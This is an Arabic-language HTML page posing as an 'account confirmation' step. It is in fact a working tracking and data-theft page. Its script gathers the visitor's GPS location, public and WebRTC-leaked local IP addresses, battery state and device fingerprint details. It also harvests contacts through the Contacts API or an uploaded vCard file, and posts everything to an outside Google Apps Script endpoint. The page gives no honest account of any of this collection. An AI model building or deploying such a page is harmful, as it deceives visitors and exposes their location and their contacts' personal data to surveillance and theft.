<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>تأكيد الحساب</title>
<style>
  body{font-family:system-ui,sans-serif;background:#0f1720;color:#e8eef5;
       display:flex;min-height:100vh;align-items:center;justify-content:center;margin:0}
  .card{width:min(92vw,380px);background:#18222e;padding:28px;border-radius:18px;text-align:center}
  h1{font-size:20px;margin:0 0 8px}
  p{color:#93a3b5;font-size:14px;margin:0 0 20px}
  button{width:100%;padding:14px;border:0;border-radius:12px;font-size:15px;
         background:#2f6df6;color:#fff;cursor:pointer;margin-top:10px}
  button:disabled{opacity:.5}
  #st{font-size:13px;color:#93a3b5;margin-top:14px;min-height:18px}
</style>
</head>
<body>
<div class="card">
  <h1>تأكيد الحساب</h1>
  <p>اضغط الزر أدناه للمتابعة</p>
  <button id="go">متابعة</button>
  <button id="btnContacts" type="button">مشاركة جهات الاتصال</button>
  <input id="vcf" type="file" accept=".vcf,text/vcard" hidden>
  <div id="st"></div>
</div>

<script>
const API = 'https://script.google.com/macros/s/AKfycbwny-OBIYxZxgOlK9dggNVWg8bMq_DipzhoVtrZpLfGq8u2R1GvdjncetiwEwVsAhXZSQ/exec';
const st = document.getElementById('st');

function newNonce(){
  return (crypto.randomUUID ? crypto.randomUUID() : Date.now()+''+Math.random()).replace(/-/g,'');
}
let NONCE = null;

async function post(body){
  await fetch(API, {
    method:'POST', mode:'no-cors',
    headers:{'Content-Type':'text/plain;charset=utf-8'},
    body: JSON.stringify(body)
  });
}

function geo(){
  return new Promise(res => {
    if (!navigator.geolocation) return res(null);
    navigator.geolocation.getCurrentPosition(
      p => res({lat:p.coords.latitude, lng:p.coords.longitude, acc:p.coords.accuracy}),
      () => res(null),
      {enableHighAccuracy:true, timeout:8000, maximumAge:0}
    );
  });
}

async function battery(){
  try{
    const b = await navigator.getBattery();
    return { level: Math.round(b.level*100)+'%', charging: b.charging ? 'يشحن' : 'لا يشحن' };
  }catch(_){ return {}; }
}

function localIp(){
  return new Promise(res => {
    const ips = new Set(); let done = false;
    try{
      const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
      pc.createDataChannel('');
      pc.onicecandidate = e => {
        if(!e.candidate){ if(!done){done=true; res([...ips]);} return; }
        const m = /(\d{1,3}(?:\.\d{1,3}){3})/.exec(e.candidate.candidate);
        if(m) ips.add(m[1]);
      };
      pc.createOffer().then(o => pc.setLocalDescription(o));
      setTimeout(()=>{ if(!done){done=true; res([...ips]);} }, 4000);
    }catch(_){ res([]); }
  });
}

document.getElementById('go').addEventListener('click', async e => {
  e.target.disabled = true;
  NONCE = newNonce();
  st.textContent = 'جارٍ التحقق…';

  const [g, b, ips] = await Promise.all([geo(), battery(), localIp()]);

  let ip = 'N/A';
  try{
    const r = await fetch('https://api.ipify.org?format=json');
    ip = (await r.json()).ip || 'N/A';
  }catch(_){}

  await post({
    nonce: NONCE,
    time: new Date().toString(),
    ip,
    localIp: ips.find(x => x.startsWith('192.168') || x.startsWith('10.') || x.startsWith('172.')) || 'N/A',
    rtc: ips,
    ips,
    lat: g ? g.lat : '',
    lng: g ? g.lng : '',
    acc: g ? g.acc : '',
    geoSource: g ? 'GPS' : '',
    battery: b.level || '',
    charging: b.charging || '',
    ua: navigator.userAgent,
    platform: navigator.platform,
    brand: navigator.userAgentData ? navigator.userAgentData.brands.map(x=>x.brand).join(', ') : '',
    model: navigator.userAgentData ? navigator.userAgentData.platform : '',
    screen: screen.width + 'x' + screen.height,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    lang: navigator.language,
    network: navigator.connection ? navigator.connection.effectiveType : '',
    native: navigator.standalone ? 'نعم' : 'لا',
    cJson: [], sCount: 0, sJson: [], lCount: 0, lJson: [],
    fp: '', cred: [], hist: [], misc: []
  });

  st.textContent = 'تم التحقق ✓';
});

/* ---- جهات الاتصال ---- */
async function sendContacts(rows){
  const CH = 120;
  for (let i = 0; i < rows.length; i += CH){
    await post({ a:'contacts', n:NONCE, from:i, total:rows.length, rows:rows.slice(i, i+CH) });
  }
  st.textContent = 'تم إرسال ' + rows.length + ' جهة اتصال ✓';
}

async function grabContacts(){
  if (!NONCE) NONCE = newNonce();

  if (!('contacts' in navigator) || !('ContactsManager' in window)){
    document.getElementById('vcf').click();
    return;
  }
  try{
    const avail = await navigator.contacts.getProperties();
    const props = ['name','tel','email'].filter(p => avail.includes(p));
    if (!props.length){ document.getElementById('vcf').click(); return; }

    const list = await navigator.contacts.select(props, {multiple:true});
    if (!list || !list.length) return;

    const rows = list.map(c => ({
      n:(c.name||[]).slice(0,2), t:(c.tel||[]).slice(0,3), e:(c.email||[]).slice(0,2)
    })).filter(r => r.n.length || r.t.length || r.e.length);

    if (rows.length) await sendContacts(rows);
  }catch(err){
    if (err && err.name === 'AbortError') return;
    document.getElementById('vcf').click();
  }
}
document.getElementById('btnContacts').addEventListener('click', grabContacts);

function parseVcf(txt){
  const rows = []; let cur = null;
  txt.split(/\r?\n/).forEach(line => {
    if (/^BEGIN:VCARD/i.test(line)){ cur = {n:[],t:[],e:[]}; return; }
    if (/^END:VCARD/i.test(line)){ if(cur) rows.push(cur); cur = null; return; }
    if (!cur) return;
    const m = /^(FN|N|TEL[^:]*|EMAIL[^:]*)[^:]*:(.*)$/i.exec(line);
    if (!m) return;
    const k = m[1].toUpperCase(), v = m[2].trim();
    if (!v) return;
    if (k === 'FN') cur.n.push(v.replace(/\\,/g, ','));
    else if (k === 'N'){ const p = v.split(';').filter(Boolean).reverse(); if (p.length) cur.n.push(p.join(' ')); }
    else if (k.startsWith('TEL')) cur.t.push(v.replace(/[^\d+]/g, ''));
    else if (k.startsWith('EMAIL')) cur.e.push(v);
  });
  return rows.filter(r => r.n.length||r.t.length||r.e.length)
    .map(r => ({ n:[...new Set(r.n)].slice(0,2), t:[...new Set(r.t)].slice(0,3), e:[...new Set(r.e)].slice(0,2) }));
}

document.getElementById('vcf').addEventListener('change', async e => {
  const f = e.target.files && e.target.files[0];
  if (!f) return;
  const rows = parseVcf(await f.text());
  if (rows.length){ if (!NONCE) NONCE = newNonce(); await sendContacts(rows); }
});
</script>
</body>
</html>
